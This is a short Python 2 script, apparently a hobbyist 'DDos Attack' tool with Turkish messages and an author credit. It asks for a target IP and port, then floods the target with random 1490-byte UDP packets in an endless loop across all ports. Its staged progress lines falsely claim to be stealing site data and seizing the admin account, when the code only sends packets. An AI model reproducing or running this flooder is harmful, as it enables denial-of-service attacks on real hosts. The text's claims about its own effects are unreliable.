import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : Kerem Kose ( Yarali  Kurt ) "
print "Web Site : http://ayyildiz.org"
print "github   : YAK?NDA!!"
print "Instegram : Ayyildiz Tim"
print
ip = raw_input("IP Veya URL : ")
port = input("IP Port Veya URL Port    : ")

os.system("clear")
os.system("figlet Sald?r? Ba?l?yor")
print "[ KEREM KOSE BAGLAN?YOR.... ] 0% "
time.sleep(5)
print "[ S?TE VER?LER? CEK?L?YOR  ] 25%"
time.sleep(5)
print "[ S?TEDEK? ONL?NELERE S?Z?LD? ] 50%"
time.sleep(5)
print "[ S?TE ADM?N HESAB? AL?N?YOR   ] 75%"
time.sleep(5)
print "[ HACKLENMEYE BASLAD?!!!!! ] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1